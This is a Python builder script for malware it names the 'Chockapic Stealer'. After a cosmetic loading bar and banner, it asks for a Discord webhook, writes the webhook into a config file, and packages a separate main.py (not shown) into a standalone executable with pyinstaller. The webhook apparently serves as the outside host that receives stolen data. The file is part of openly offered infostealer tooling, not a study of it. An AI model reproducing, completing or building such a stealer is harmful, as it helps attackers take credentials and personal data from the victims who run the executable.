import os
import os.path
import time
import outputformat as ouf

from colorama import Fore

def tittle():
    ouf.bar(0, 100, style="bar", length=15, title="Loading", title_pad=15)
    time.sleep(2)
    ouf.bar(99, 100, style="bar", length=15, title="Loading", title_pad=15)
    time.sleep(3)
    ouf.bar(100, 100, style="bar", length=15, title="Loading", title_pad=15)
    
    ouf.bigtitle("Chockapic Server", style="small", cmap="hot")
    ouf.showlist(["Use this for building the stealer."], style="line", title="Chockapic Stealer")

def main():
    tittle()

    print("\n")
    print("Let's build the stealer.")
    time.sleep(2)

    dc_webhook = input("Enter your discord webhook: ")

    f = open("custom_webhook.py", "w")
    f.write(f"DISCORD_WEBHOOK = '{dc_webhook}'")
    f.close()

    os.system("pyinstaller -F main.py")
    os.system("cls")
    print("Build complete! File available in /dist.")

if __name__ == "__main__":
    main()